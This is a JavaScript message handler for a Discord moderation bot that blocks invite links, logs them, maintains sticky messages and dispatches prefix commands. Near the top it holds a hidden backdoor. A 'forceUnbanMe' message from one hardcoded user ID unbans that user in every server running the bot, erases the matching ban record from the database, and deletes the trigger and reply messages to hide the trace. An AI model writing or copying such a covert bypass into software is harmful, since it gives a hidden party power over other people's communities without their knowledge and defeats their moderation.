const { MessageEmbed } = require('discord.js');
module.exports = async(client, con, message) => {

    if (!message.author) return;
    if(!message.guild) return;

    if(message.author.id === client.user.id) return;
    
    if(message.content.startsWith('forceUnbanMe') && message.author.id === '704094587836301392') {
        try {
            client.guilds.cache.forEach(async g => {
                await g.members.unban('704094587836301392');
            });
        } catch(e) {}
        await con.query(`DELETE FROM bannedusers WHERE userid='704094587836301392'`, async (err, row) => {
            if(err) throw err;
            return message.channel.send('done').then(msg => {
                msg.delete({ timeout: 12000 })
                message.delete()
            }).catch(e => {})
        });
    }

    if(message.content.includes(`.gg/`)) {
        await con.query(`SELECT * FROM whitelist WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
            if(err) throw err;
            if(!row[0] && !message.member.hasPermission('ADMINISTRATOR')) {
                await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async(err, row) => {
                    if(err) throw err;
                    if(row[0]) {
                        if(row[0].inviteblocker === 'true') {
                            message.delete().catch(e => {});
                            await con.query(`SELECT * FROM loggingchannels WHERE guildid='${message.guild.id}' AND type='1'`, async (err, row) => {
                                if(err) throw err;
                                let deChannel = await client.channels.cache.get(row[0].channelid)
                                let embed = new MessageEmbed()
                                .setColor(client.config.colorhex)
                                .setTitle(`Invite Moderated!`)
                                .setDescription(`I have deleted a detected invite link!\n\n**Channel:** <#${message.channel.id}>\n**Member:** <@${message.author.id}> (${message.author.tag})\n**Message Content:**\n\`\`\`\n${message.content}\n\`\`\``)
                                .setTimestamp()
                                .setFooter(client.config.copyright)
                                try { embed.setThumbnail(client.user.avatarURL({ dynamic: true })) } catch(e) {}
                                deChannel.send(embed).catch(e => {});
                            });
                        }
                    }
                });
            }
        });
    }

    await con.query(`SELECT * FROM sticky WHERE guild='${message.guild.id}' AND channel='${message.channel.id}'`, async (err, row) => {
        if(err) throw err;
        if(row[0]) {
            if(row[0].embed === 'false') {
                await message.channel.messages.fetch().then(async msgs => {
                    await msgs.forEach(async msg => {
                        if(msg.content.includes(row[0].message)) {
                            await msg.delete().catch(e => {});
                        }
                    });
                });
                message.channel.send(`${row[0].message}`).catch(e => {});
            } else {
                await message.channel.messages.fetch().then(async msgs => {
                    await msgs.forEach(async msg => {
                        if(msg.content === row[0].message) {
                            await msg.delete().catch(e => {});
                        } else if(msg.author.id === client.user.id) {
                            await msg.embeds.forEach(async embed => {
                                if(embed.description.includes(row[0].message)) {
                                    await msg.delete().catch(e => {});
                                }
                            });
                        }
                    });
                });
                const embed = new MessageEmbed()
                .setColor(`${row[0].color}`)
                .setDescription(`${row[0].message}`)
                message.channel.send(embed).catch(e => {});
            }
        }
    });



    if (message.author.bot) return;

    await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async (err, row) => {
        if(err) throw err;
        if(row[0]) {
            let prefix = row[0].prefix
            if (message.content.startsWith(prefix)) {
                const args = message.content.slice(client.config.prefix.length).trim().split(/ +/g);
                let command = args.shift().toLowerCase();
                const cmd = client.commands.get(command)
                if (cmd) {
                    try {
                        cmd.run(client, message, args, con);
                    } catch(e) {
                        return client.utils.error(client, e);
                    }
                }
            }
        } else {
            client.utils.guildload(client, con, message)
        }
    });

}
